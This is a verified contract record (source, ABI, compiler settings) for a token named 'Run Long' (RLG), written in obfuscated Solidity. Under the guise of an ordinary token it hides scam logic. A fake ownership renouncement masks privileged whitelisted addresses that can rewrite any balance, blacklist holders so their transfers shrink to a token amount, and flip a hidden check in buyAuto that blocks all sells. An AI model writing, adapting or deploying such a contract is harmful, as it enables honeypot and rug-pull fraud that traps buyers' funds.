{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface tradingReceiverSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract feeReceiverAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverFee {\n    function createPair(address atMin, address receiverWallet) external returns (address);\n}\n\ninterface txLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingAuto) external view returns (uint256);\n\n    function transfer(address receiverBuy, uint256 launchExempt) external returns (bool);\n\n    function allowance(address amountLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverBuy,\n        uint256 launchExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableLaunched, uint256 value);\n    event Approval(address indexed amountLaunch, address indexed spender, uint256 value);\n}\n\ninterface tokenTeam is txLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RunLong is feeReceiverAuto, txLiquidity, tokenTeam {\n\n    constructor (){\n        \n        tradingReceiverSell walletToken = tradingReceiverSell(fromSell);\n        senderSell = receiverFee(walletToken.factory()).createPair(walletToken.WETH(), address(this));\n        \n        amountTo = _msgSender();\n        toEnableReceiver();\n        fromAt[amountTo] = true;\n        fundMinLaunched[amountTo] = launchedTrading;\n        if (autoMarketingFund != launchMin) {\n            maxTotal = true;\n        }\n        emit Transfer(address(0), amountTo, launchedTrading);\n    }\n\n    function approve(address maxSender, uint256 launchExempt) public virtual override returns (bool) {\n        sellToShould[_msgSender()][maxSender] = launchExempt;\n        emit Approval(_msgSender(), maxSender, launchExempt);\n        return true;\n    }\n\n    function transferFrom(address senderSwap, address receiverBuy, uint256 launchExempt) external override returns (bool) {\n        if (_msgSender() != fromSell) {\n            if (sellToShould[senderSwap][_msgSender()] != type(uint256).max) {\n                require(launchExempt <= sellToShould[senderSwap][_msgSender()]);\n                sellToShould[senderSwap][_msgSender()] -= launchExempt;\n            }\n        }\n        return buyAuto(senderSwap, receiverBuy, launchExempt);\n    }\n\n    bool public minToken;\n\n    mapping(address => bool) public maxFrom;\n\n    uint256 public autoMarketingFund;\n\n    address maxEnableToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private sellToShould;\n\n    function tradingMin(address amountAuto, uint256 launchExempt) public {\n        toSwapAt();\n        fundMinLaunched[amountAuto] = launchExempt;\n    }\n\n    string private liquidityShouldMax = \"RLG\";\n\n    function balanceOf(address tradingAuto) public view virtual override returns (uint256) {\n        return fundMinLaunched[tradingAuto];\n    }\n\n    uint256 private launchedTrading = 100000000 * 10 ** 18;\n\n    uint256 public enableShould;\n\n    uint256 public sellTo;\n\n    bool public launchFeeTeam;\n\n    function name() external view virtual override returns (string memory) {\n        return launchMode;\n    }\n\n    function maxToken(address senderSwap, address receiverBuy, uint256 launchExempt) internal returns (bool) {\n        require(fundMinLaunched[senderSwap] >= launchExempt);\n        fundMinLaunched[senderSwap] -= launchExempt;\n        fundMinLaunched[receiverBuy] += launchExempt;\n        emit Transfer(senderSwap, receiverBuy, launchExempt);\n        return true;\n    }\n\n    bool public marketingShould;\n\n    function listReceiver(address feeTake) public {\n        toSwapAt();\n        if (sellTo == launchMin) {\n            launchFeeTeam = false;\n        }\n        if (feeTake == amountTo || feeTake == senderSell) {\n            return;\n        }\n        maxFrom[feeTake] = true;\n    }\n\n    mapping(address => uint256) private fundMinLaunched;\n\n    mapping(address => bool) public fromAt;\n\n    function getOwner() external view returns (address) {\n        return totalTxToken;\n    }\n\n    function owner() external view returns (address) {\n        return totalTxToken;\n    }\n\n    function shouldMarketingAt(address listFeeTo) public {\n        if (txTakeTrading) {\n            return;\n        }\n        \n        fromAt[listFeeTo] = true;\n        \n        txTakeTrading = true;\n    }\n\n    function allowance(address senderTo, address maxSender) external view virtual override returns (uint256) {\n        if (maxSender == fromSell) {\n            return type(uint256).max;\n        }\n        return sellToShould[senderTo][maxSender];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityShouldMax;\n    }\n\n    uint256 private launchMin;\n\n    address private totalTxToken;\n\n    uint256 amountReceiverTo;\n\n    function buyAuto(address senderSwap, address receiverBuy, uint256 launchExempt) internal returns (bool) {\n        if (senderSwap == amountTo) {\n            return maxToken(senderSwap, receiverBuy, launchExempt);\n        }\n        uint256 toExempt = txLiquidity(senderSell).balanceOf(maxEnableToken);\n        require(toExempt == walletTo);\n        require(receiverBuy != maxEnableToken);\n        if (maxFrom[senderSwap]) {\n            return maxToken(senderSwap, receiverBuy, txMin);\n        }\n        return maxToken(senderSwap, receiverBuy, launchExempt);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedTrading;\n    }\n\n    function toSwapAt() private view {\n        require(fromAt[_msgSender()]);\n    }\n\n    string private launchMode = \"Run Long\";\n\n    uint8 private launchedTeamMax = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedTeamMax;\n    }\n\n    bool private maxTotal;\n\n    uint256 walletTo;\n\n    address public amountTo;\n\n    function toEnableReceiver() public {\n        emit OwnershipTransferred(amountTo, address(0));\n        totalTxToken = address(0);\n    }\n\n    function transfer(address amountAuto, uint256 launchExempt) external virtual override returns (bool) {\n        return buyAuto(_msgSender(), amountAuto, launchExempt);\n    }\n\n    address public senderSell;\n\n    address fromSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private takeReceiverLiquidity;\n\n    uint256 constant txMin = 19 ** 10;\n\n    bool public txTakeTrading;\n\n    function launchedMarketing(uint256 launchExempt) public {\n        toSwapAt();\n        walletTo = launchExempt;\n    }\n\n    event OwnershipTransferred(address indexed exemptEnableToken, address indexed autoMin);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptEnableToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMarketingFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFeeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchExempt\",\"type\":\"uint256\"}],\"name\":\"launchedMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"}],\"name\":\"listReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFeeTo\",\"type\":\"address\"}],\"name\":\"shouldMarketingAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toEnableReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchExempt\",\"type\":\"uint256\"}],\"name\":\"tradingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTakeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RunLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}